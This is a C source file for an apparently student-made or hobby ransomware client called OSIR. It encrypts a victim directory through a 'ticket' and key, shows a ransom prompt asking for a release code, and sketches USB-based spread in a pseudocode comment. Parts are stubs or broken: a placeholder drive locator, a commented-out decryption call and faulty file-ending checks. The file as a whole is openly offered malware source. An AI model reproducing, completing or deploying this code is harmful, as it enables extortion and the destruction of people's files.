/*
	Main source file for OSIR client
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "common/clonelib.h"
#include "common/ransomlib.h"
#include "common/common.h"
#include "common/os.h"
#include "common/thirdparty/b64.h"

void locateExternalDrive(char **path)
{
	*path = (char *) malloc(sizeof(char) * strlen("placeholder"));
	strcpy(*path, "placeholder");
}

//Ransomware payload
bool runPayload(const char *directory)
{
	char *keyiv;
	bool status;

	//Make ticket
	if (makeTicket(&keyiv, directory)) {
		//Upon success, encrypt directory
		status = encryptDirectory(keyiv, directory);
		free(keyiv);
	} else {
		fprintf(stderr, "runPayload: makeTicket failed\n");
		return 0;
	}
	return status;
}

bool runRelease(char *keyiv)
{
	return decryptDirectory(keyiv, ".");
}


int main(int argc, char **argv)
{
	argc = argc;
	bool run_release = false;

	//Check if ticket exists in current directory
	if (fopen(TICKET_FILENAME, "r") != NULL) {

		//Check if ransom shit actually exists
		char **ls = walkDir(".");
		for (int i = 0; strcmp(ls[i], "\0"); i++) {

			//Check for ransom file endings
			if (strcmp(strrchr(ls[i], '.'), ".ransom")) {
				run_release = true;
				break;
			}
		}
	}

	if (run_release) {
		//Prepare interface
		system(RELEASE_INTRO_SCRIPT);
		printf("To decrypt your files, please visit\n%s\n"
		       "and paste the release code.\n\n", "x");

		bool success = 0;

		//Prompt for code
		char code[64];
		while (!success) {
			printf(">>>");
			scanf("%s", code);

			//Check if code is proper length
			if (strlen(code) ==
			    (SYMMETRIC_KEY_SIZE + SYMMETRIC_IV_SIZE) * 2) {
				//Decode
				char *keyiv = b16decode(code);

				//Release
				//success=decryptDirectory(keyiv, ".");
				if (!success)
					printf("Wrong code\n");
			} else {
				printf("Invalid Code\n");
			}

		}
	}

	/*
	   if(ticket in working_directory):
	   prompt for code
	   runRelease
	   else:
	   find infection directory (usb)
	   runInfection
	   find hostage directory (documents or wherever)
	   runPayload
	   Open Browser
	   endif
	 */
	return 0;
}
